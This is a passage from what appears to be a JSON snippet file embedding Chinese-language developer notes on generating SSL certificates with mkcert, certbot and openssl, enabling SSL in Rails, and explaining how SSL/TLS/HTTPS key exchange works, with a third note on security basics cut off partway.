      "<div><h1>[IS] 產生 SSL 憑證</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"透過-mkcert開發用\">透過 mkcert（開發用）<a href=\"#透過-mkcert開發用\" class=\"hash-link\" aria-label=\"透過 mkcert（開發用）的直接連結\" title=\"透過 mkcert（開發用）的直接連結\">​</a></h2><blockquote><p><a href=\"https://github.com/FiloSottile/mkcert\" target=\"_blank\" rel=\"noopener noreferrer\">mkcert</a> @ GitHub</p></blockquote><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ brew </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">install</span><span class=\"token plain\"> mkcert</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># Created a new local CA</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ mkcert -install</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># Created a new certificate valid for the following names</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ mkcert example.com </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;*.example.com&quot;</span><span class=\"token plain\"> example.test localhost </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">127.0</span><span class=\"token plain\">.0.1 ::1</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"透過-lets-encrypt\">透過 Let&#x27;s Encrypt<a href=\"#透過-lets-encrypt\" class=\"hash-link\" aria-label=\"透過 Let&#x27;s Encrypt的直接連結\" title=\"透過 Let&#x27;s Encrypt的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"安裝-certbot\">安裝 <strong><a href=\"https://certbot.eff.org/\" target=\"_blank\" rel=\"noopener noreferrer\">certbot</a></strong><a href=\"#安裝-certbot\" class=\"hash-link\" aria-label=\"安裝-certbot的直接連結\" title=\"安裝-certbot的直接連結\">​</a></h3><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ brew </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">install</span><span class=\"token plain\"> certbot</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"產生-ssl-憑證\">產生 SSL 憑證<a href=\"#產生-ssl-憑證\" class=\"hash-link\" aria-label=\"產生 SSL 憑證的直接連結\" title=\"產生 SSL 憑證的直接連結\">​</a></h3><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">sudo</span><span class=\"token plain\"> certbot certonly </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">--config-dir</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\">/Users/pjchender/Projects/certbot/config </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">--work-dir</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\">/Users/pjchender/Projects/certbot </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">--logs-dir</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\">/Users/pjchender/Projects/certbot/logs </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">--server https://acme-v02.api.letsencrypt.org/directory </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">--manual --preferred-challenges dns </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">-d familyline.jubo.health </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">-d *.jubo.health</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>完成驗證後在指定路徑中將會看到對應的 certification 和 key。</p><p>若沒有檢視該資料夾的權限，可以使用：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">sudo</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">chmod</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">755</span><span class=\"token plain\"> /certbot/config/archive/familyline.jubo.health</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>或者透過 Finder 以右鍵點擊該資料夾後找到「Get Info」的選項，接著在最下方的找到「+」，把自己的角色加入權限中：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/AyIKV49.png\" alt=\"certbot\" class=\"img_ev3q\"></p><div class=\"theme-admonition theme-admonition-info alert alert--info admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z\"></path></svg></span>信息</div><div class=\"admonitionContent_S0QG\"><p>實際的 certificate 檔案會放在 <code>/certbot/config/archive/familyline.jubo.health</code> 中，而不是 <code>/certbot/config/live/familyline.jubo.health</code> 內，<code>live</code> 內放的僅是捷徑。</p></div></div><blockquote><ul><li><a href=\"https://andyyou.github.io/2019/04/13/how-to-use-certbot/\" target=\"_blank\" rel=\"noopener noreferrer\">解析 Certbot（Let&#x27;s encrypt） 使用方式</a> @ andyyou</li><li><a href=\"https://blog.gtwang.org/linux/secure-nginx-with-lets-encrypt-ssl-certificate-on-ubuntu-and-debian/\" target=\"_blank\" rel=\"noopener noreferrer\">NGINX 使用 Let’s Encrypt 免費 SSL 憑證設定 HTTPS 安全加密網頁教學</a> @ GTW</li></ul></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"其他指令\">其他指令<a href=\"#其他指令\" class=\"hash-link\" aria-label=\"其他指令的直接連結\" title=\"其他指令的直接連結\">​</a></h3><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">sudo</span><span class=\"token plain\"> certbot certificates  </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 查詢憑證</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">sudo</span><span class=\"token plain\"> certbot renew         </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 更新憑證</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"透過-openssl-自己簽發-https-憑證self-signed-certificates\">透過 openssl 自己簽發 HTTPS 憑證（self-signed certificates）<a href=\"#透過-openssl-自己簽發-https-憑證self-signed-certificates\" class=\"hash-link\" aria-label=\"透過 openssl 自己簽發 HTTPS 憑證（self-signed certificates）的直接連結\" title=\"透過 openssl 自己簽發 HTTPS 憑證（self-signed certificates）的直接連結\">​</a></h2><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 安裝 openssl</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">brew </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">install</span><span class=\"token plain\"> openssl</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><div class=\"theme-admonition theme-admonition-info alert alert--info admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z\"></path></svg></span>信息</div><div class=\"admonitionContent_S0QG\"><p>Self-signed certificates 不會被瀏覽器所接受，如果使用的是 Chrome，可以在警告頁面輸入 <code>thisisunsafe</code> 來繞過這個警告。</p></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用-openssl-產生憑證方法一\">使用 openSSL 產生憑證（方法一）<a href=\"#使用-openssl-產生憑證方法一\" class=\"hash-link\" aria-label=\"使用 openSSL 產生憑證（方法一）的直接連結\" title=\"使用 openSSL 產生憑證（方法一）的直接連結\">​</a></h3><p>在專案中執行下述指令：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">openssl req -new -newkey rsa:2048 -new -nodes -keyout key.pem -out csr.pem</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">openssl x509 -req -days </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">365</span><span class=\"token plain\"> -in csr.pem -signkey key.pem -out server.crt</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"幫-localhost-簽發憑證方法二\">幫 localhost 簽發憑證（方法二）<a href=\"#幫-localhost-簽發憑證方法二\" class=\"hash-link\" aria-label=\"幫 localhost 簽發憑證（方法二）的直接連結\" title=\"幫 localhost 簽發憑證（方法二）的直接連結\">​</a></h3><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># create SSL certificate of localhost for developing</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">openssl req -x509 -out localhost.crt -keyout localhost.key </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  -newkey rsa:2048 -nodes -sha256 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">\\</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  -subj </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;/CN=localhost&#x27;</span><span class=\"token plain\"> -extensions EXT -config </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&lt;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token builtin class-name\" style=\"color:rgb(255, 203, 107)\">printf</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;[dn]</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">CN=localhost</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">[req]</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">distinguished_name = dn</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">[EXT]</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">subjectAltName=DNS:localhost</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">keyUsage=digitalSignature</span><span class=\"token string entity\" style=\"color:rgb(195, 232, 141)\">\\n</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">extendedKeyUsage=serverAuth&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"heroku-上設定\">heroku 上設定<a href=\"#heroku-上設定\" class=\"hash-link\" aria-label=\"heroku 上設定的直接連結\" title=\"heroku 上設定的直接連結\">​</a></h2><p><img loading=\"lazy\" src=\"../../../i.imgur.com/qoLSqU0.png\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"在-rails-中設定以啟用-ssl\">在 Rails 中設定以啟用 SSL<a href=\"#在-rails-中設定以啟用-ssl\" class=\"hash-link\" aria-label=\"在 Rails 中設定以啟用 SSL的直接連結\" title=\"在 Rails 中設定以啟用 SSL的直接連結\">​</a></h2><div class=\"language-ruby codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-ruby codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># ./config/environments/production.rb</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">config.force_ssl = true</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] SSL, TLS 和 HTTPS pjchender.dev": {
    "prefix": "hinternet [IS] SSL, TLS 和 HTTPS pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] SSL, TLS 和 HTTPS</h1></header><div class=\"theme-admonition theme-admonition-info alert alert--info admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z\"></path></svg></span>參考資料</div><div class=\"admonitionContent_S0QG\"><ul><li>👍 <a href=\"https://www.youtube.com/watch?v=j9QmMEWmcfo\" target=\"_blank\" rel=\"noopener noreferrer\">SSL, TLS, HTTPS Explained</a> @ ByteByteGo</li><li>👍 <a href=\"https://howhttps.works/\" target=\"_blank\" rel=\"noopener noreferrer\">HOW HTTPS WORKS</a></li></ul></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tldr\">TL;DR<a href=\"#tldr\" class=\"hash-link\" aria-label=\"TL;DR的直接連結\" title=\"TL;DR的直接連結\">​</a></h2><ul><li>公鑰和私鑰是一對的，被公鑰加密的內容，只能透過該把私鑰解密</li><li>憑證（certificate）的目的是在證明「這把公鑰真的是這個伺服器的」，避免有人偽裝該伺服器來騙取你的鑰匙</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"流程\">流程<a href=\"#流程\" class=\"hash-link\" aria-label=\"流程的直接連結\" title=\"流程的直接連結\">​</a></h2><ol><li><p>server 上有公鑰和私鑰，這副鑰匙是一對的，用來進行「<a href=\"../is-internet-security/index.html#%E5%8A%A0%E5%AF%86%E8%88%87%E9%9B%BB%E5%AD%90%E8%AD%89%E6%9B%B8\" target=\"_blank\" rel=\"noopener noreferrer\">非對稱加密</a>」</p><ul><li><p>以此公鑰加密之後，只能透過對應的私鑰進行解密</p></li><li><p>server 向 client 提供「公鑰」</p></li></ul></li><li><p>client 有用來做「<a href=\"../is-internet-security/index.html#%E5%8A%A0%E5%AF%86%E8%88%87%E9%9B%BB%E5%AD%90%E8%AD%89%E6%9B%B8\" target=\"_blank\" rel=\"noopener noreferrer\">對稱加密</a>」的鑰匙</p><ul><li>client 將這把鑰匙以 server 提供的公鑰進行加密</li></ul></li><li><p>server 收到透過公鑰加密過的「由 client 提供的密鑰」後，</p><ul><li><p>以 server 自己的私鑰解密</p></li><li><p>解密後可以取得 client 提供的密鑰</p></li></ul></li><li><p>後續 server 和 client 溝通時，都會透過由 client 提供的這把密鑰來進行「對稱式的加解密」</p></li></ol><p><img loading=\"lazy\" src=\"../../../i.imgur.com/vYwAj0T.jpg\" alt=\"HTTPs illustrated\" class=\"img_ev3q\"></p><blockquote><p>圖片來源：<a href=\"https://www.youtube.com/watch?v=j9QmMEWmcfo\" target=\"_blank\" rel=\"noopener noreferrer\">SSL, TLS, HTTPS Explained</a> @ ByteByteGo</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://www.youtube.com/watch?v=T4Df5_cojAs&amp;ab_channel=kubucation\" target=\"_blank\" rel=\"noopener noreferrer\">How does HTTPS work? What&#x27;s a CA? What&#x27;s a self-signed Certificate?</a> by kubucation @ Youtube</li><li><a href=\"https://www.youtube.com/watch?v=w0QbnxKRD0w&amp;ab_channel=thecuriousengineer\" target=\"_blank\" rel=\"noopener noreferrer\">How HTTPS works</a> @ YouTube</li><li><a href=\"https://www.websecurity.digicert.com/zh/hk/security-topics/what-is-ssl-tls-https\" target=\"_blank\" rel=\"noopener noreferrer\">什麼是 SSL、TLS 以及 HTTPS？</a> @ digicert</li><li><a href=\"https://www.facebook.com/will.fans/videos/374050803968418\" target=\"_blank\" rel=\"noopener noreferrer\">深入理解 TLS/SSL 安全加密協定</a> @ Will 保哥的技術交流中心</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] 網路資訊安全 pjchender.dev": {
    "prefix": "hinternet [IS] 網路資訊安全 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] 網路資訊安全</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資安三要素機密性完整性可用性\">資安三要素：機密性、完整性、可用性<a href=\"#資安三要素機密性完整性可用性\" class=\"hash-link\" aria-label=\"資安三要素：機密性、完整性、可用性的直接連結\" title=\"資安三要素：機密性、完整性、可用性的直接連結\">​</a></h2><p>資訊安全三大要素主要包含：</p><ul><li><strong>機密性（Confidentiality）</strong>：只有擁有權限的使用者才能存取資料。</li><li><strong>完整性（Integrity）</strong>：維護資訊原有內容，而不會被竄改。</li><li><strong>可用性（Availability）</strong>：需要時容易隨時取用。</li></ul><blockquote><p>資訊安全亦簡稱為 <strong>CIA</strong>，就是取三大要素的字首。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"加密與電子憑證\">加密與電子憑證<a href=\"#加密與電子憑證\" class=\"hash-link\" aria-label=\"加密與電子憑證的直接連結\" 